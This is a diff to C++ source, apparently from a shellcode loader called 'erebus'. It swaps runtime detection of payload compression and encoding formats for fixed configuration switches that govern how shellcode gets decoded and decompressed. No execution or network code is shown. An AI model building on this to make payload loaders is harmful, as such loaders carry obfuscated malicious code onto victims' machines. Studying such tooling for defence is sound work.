@@ -392,162 +392,11 @@ namespace erebus {
 	// AUTO-DETECTION LOGIC
 	// ============================================================
 
-	enum CompressionFormat {
-		FORMAT_NONE = 0,
-		FORMAT_LZNT1 = 1,
-		FORMAT_RLE = 2,
-		FORMAT_BASE64 = 3,
-		FORMAT_ASCII85 = 4,
-		FORMAT_ALPHA32 = 5,
-		FORMAT_WORDS256 = 6
-	};
-
-	CompressionFormat DetectCompressionFormat(_In_ const BYTE* Input, IN SIZE_T InputLen)
-	{
-		if (!Input || InputLen < 2)
-			return FORMAT_NONE;
-
-		// Check for LZNT1 compression signature
-		if (InputLen >= 4 && (Input[0] & 0x80) != 0)
-		{
-			LOG_INFO("Detected LZNT1 compression");
-			return FORMAT_LZNT1;
-		}
-
-		// Check for RLE (Run-Length Encoding) - look for 0xFF markers
-		if (InputLen >= 3)
-		{
-			int RleMarkerCount = 0;
-			for (SIZE_T i = 0; i < min(InputLen - 2, 100); i++)
-			{
-				if (Input[i] == 0xFF && i + 2 < InputLen)
-				{
-					RleMarkerCount++;
-				}
-			}
-			if (RleMarkerCount > 0)
-			{
-				LOG_INFO("Detected RLE compression (%d markers found)", RleMarkerCount);
-				return FORMAT_RLE;
-			}
-		}
-
-		LOG_INFO("No compression detected");
-		return FORMAT_NONE;
-	}
-
-	BOOL IsValidBase64Char(CHAR c)
-	{
-		return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
-			(c >= '0' && c <= '9') || c == '+' || c == '/' || c == '=' ||
-			c == ' ' || c == '\t' || c == '\n' || c == '\r';
-	}
-
-	BOOL IsValidASCII85Char(CHAR c)
-	{
-		return (c >= 33 && c <= 117) || c == '!' || c == ' ' || c == '\t' || c == '\n' || c == '\r';
-	}
-
-	BOOL IsValidALPHA32Char(CHAR c)
-	{
-		const CHAR Alpha32Alphabet[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/";
-		return strchr(Alpha32Alphabet, c) != NULL;
-	}
-
-	BOOL IsValidWORDS256Format(_In_ const CHAR* Input, IN SIZE_T InputLen)
-	{
-		// Check if input is space-separated numbers 0-255
-		SIZE_T i = 0;
-		int WordCount = 0;
-
-		while (i < InputLen && WordCount < 100)
-		{
-			// Skip delimiters
-			while (i < InputLen && (Input[i] == ' ' || Input[i] == '\t' || Input[i] == '\n' || Input[i] == '\r'))
-				i++;
-
-			if (i >= InputLen) break;
-
-			// Check if word contains only digits
-			SIZE_T WordStart = i;
-			while (i < InputLen && Input[i] >= '0' && Input[i] <= '9')
-				i++;
-
-			SIZE_T WordLen = i - WordStart;
-			if (WordLen == 0 || WordLen > 3)
-				return FALSE;
-
-			WordCount++;
-		}
-
-		return WordCount > 0;
-	}
-
-	CompressionFormat DetectEncodingFormat(_In_ const CHAR* Input, IN SIZE_T InputLen)
-	{
-		if (!Input || InputLen < 4)
-			return FORMAT_NONE;
-
-		// Check for Base64
-		int Base64ValidCount = 0;
-		for (SIZE_T i = 0; i < InputLen; i++)
-		{
-			if (IsValidBase64Char(Input[i]))
-				Base64ValidCount++;
-		}
-		if (Base64ValidCount > (InputLen * 0.9))
-		{
-			LOG_INFO("Detected Base64 encoding");
-			return FORMAT_BASE64;
-		}
-
-		// Check for ASCII85
-		int ASCII85ValidCount = 0;
-		for (SIZE_T i = 0; i < InputLen; i++)
-		{
-			if (IsValidASCII85Char(Input[i]))
-				ASCII85ValidCount++;
-		}
-		if (ASCII85ValidCount > (InputLen * 0.8))
-		{
-			LOG_INFO("Detected ASCII85 encoding");
-			return FORMAT_ASCII85;
-		}
-
-		// Check for ALPHA32
-		BOOL IsAlpha32 = TRUE;
-		for (SIZE_T i = 0; i < InputLen; i++)
-		{
-			if (!IsValidALPHA32Char(Input[i]))
-			{
-				IsAlpha32 = FALSE;
-				break;
-			}
-		}
-		if (IsAlpha32)
-		{
-			LOG_INFO("Detected ALPHA32 encoding");
-			return FORMAT_ALPHA32;
-		}
-
-		// Check for WORDS256
-		if (IsValidWORDS256Format(Input, InputLen))
-		{
-			LOG_INFO("Detected WORDS256 encoding");
-			return FORMAT_WORDS256;
-		}
-
-		LOG_INFO("No encoding detected");
-		return FORMAT_NONE;
-	}
-	
 	VOID AutoDetectAndDecode(_Inout_ BYTE** Shellcode, _Inout_ SIZE_T* ShellcodeLen)
 	{
-		LOG_INFO("Analyzing shellcode format...");
+		LOG_INFO("Decompressing shellcode...");
 
-		CompressionFormat format = DetectCompressionFormat(*Shellcode, *ShellcodeLen);
-
-		switch (format)
+		switch (CONFIG_COMPRESSION_TYPE)
 		{
 			case FORMAT_LZNT1:
 			{
@@ -558,23 +407,20 @@ namespace erebus {
 			case FORMAT_RLE:
 			{
 				LOG_SUCCESS("Decompressing with RLE");
-				SIZE_T NewLen = 0;
 				DecompressionRLE(Shellcode, ShellcodeLen);
 				break;
 			}
 			default:
-				LOG_INFO("No binary compression detected, skipping decompression");
+				LOG_INFO("No compression configured (CONFIG_COMPRESSION_TYPE = 0), skipping decompression");
 				break;
 		}
 	}
 
 	VOID AutoDetectAndDecodeString(_In_ CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
 	{
-		LOG_INFO("Analyzing encoding format...");
+		LOG_INFO("Decoding shellcode...");
 
-		CompressionFormat format = DetectEncodingFormat(Input, InputLen);
-
-		switch (format)
+		switch (CONFIG_ENCODING_TYPE)
 		{
 		case FORMAT_BASE64:
 		{
@@ -602,7 +448,7 @@ namespace erebus {
 		}
 		default:
 		{
-			LOG_INFO("No encoding detected, returning raw input");
+			LOG_INFO("No encoding configured (CONFIG_ENCODING_TYPE = 0), returning raw input");
 			*Output = new BYTE[InputLen];
 			RtlCopyMemory(*Output, Input, InputLen);
 			*OutputLen = InputLen;
@@ -618,12 +464,10 @@ namespace erebus {
 	VOID DecompressShellcode(_Inout_ BYTE** Shellcode, _Inout_ SIZE_T* ShellcodeLen)
 	{
 		LOG_INFO("========================================");
-		LOG_INFO("Shellcode Decompression (Auto-Detect)");
+		LOG_INFO("Shellcode Decompression (CONFIG-based)");
 		LOG_INFO("========================================");
 
-		CompressionFormat compressionFormat = DetectCompressionFormat(*Shellcode, *ShellcodeLen);
-
-		switch (compressionFormat)
+		switch (CONFIG_COMPRESSION_TYPE)
 		{
 		case FORMAT_LZNT1:
 		{
@@ -640,7 +484,7 @@ namespace erebus {
 			break;
 		}
 		default:
-			LOG_INFO("No compression detected");
+			LOG_INFO("No compression configured (CONFIG_COMPRESSION_TYPE = 0)");
 			break;
 		}
 
